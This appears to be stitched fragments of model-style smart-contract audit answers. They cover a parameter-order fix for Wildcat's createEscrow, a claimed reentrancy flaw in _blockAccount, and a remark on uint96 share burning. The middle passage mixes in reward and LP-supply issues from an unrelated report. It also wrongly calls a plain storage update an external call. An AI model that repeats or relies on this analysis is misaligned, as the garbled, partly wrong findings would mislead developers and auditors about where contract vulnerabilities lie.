Steps\n\n1. Fix the order of parameters in `WildcatSanctionsSentinel#createEscrow(borrower, account, asset)`:\n\n```diff\n  function createEscrow(\n-   address borrower,\n+   address account,\n-   address account,\n+   address borrower,\n    address asset\n  ) public override returns (address escrowContract) {\n```\n\n\n\n\n\n## Assessed type\n\nError"

However, the provided function `_blockAccount` introduces a different vulnerability: a potential reentrancy attack.\n\nThe `_blockAccount` function changes the approval state of an account and, in the case of a positive scaledBalance, sends assets to an escrow account. The code snippet includes external calls within this function:\n\n```solidity\naddress escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n  accountAddress,\n  borrower,\n  address(this)\n);\n```\n\nand\n\n```solidity\n_accounts[escrow].scaledBalance += scaledBalance;\n```\n\nThese external calls to another contract (`IWildcatSanctionsSentinel`) could potentially allow for reentrancy if the called contract is malicious or if it has a function that allows for reentrancy into the `_blockAccount` function. This is due to the state updates occurring after these calls, which is a classic reentrancy pattern:\n\n```solidity\n_accounts[accountAddress].approval = AuthRole.Blocked;\n...\n_accounts[accountAddress] = account;\n```\n\nTo avoid reentrancy vulnerabilities, the state updates should be done before making the external calls (following the Checks-Effects-Interactions pattern). The escrow creation should not interfere with the account state updates or the distribution of scaledBalance.\n\nIt's important to note that this reentrancy vulnerability is separate from the reward calculation issue. The reward distribution problem is primarily an accounting logic issue, and as outlined in the report, it can have significant effects on the fairness and accuracy of the system.\n\nThe recommended mitigation steps for the reward calculation issue are to ensure that the lending/borrow accrual happens before reward distribution and that the total LP supply and total debt are updated correctly. To mitigate the reentrancy vulnerability, one should ensure that no external calls are made before state changes are finalized within the contract.",

It is not a withdrawal function and does not involve burning of shares, thus, the vulnerability associated with the shares not being burned correctly due to the use of a `uint96` data type cannot be inferred from this function alone. Analysis of the actual withdrawal function and the associated share burning logic is required to evaluate the described vulnerability.",
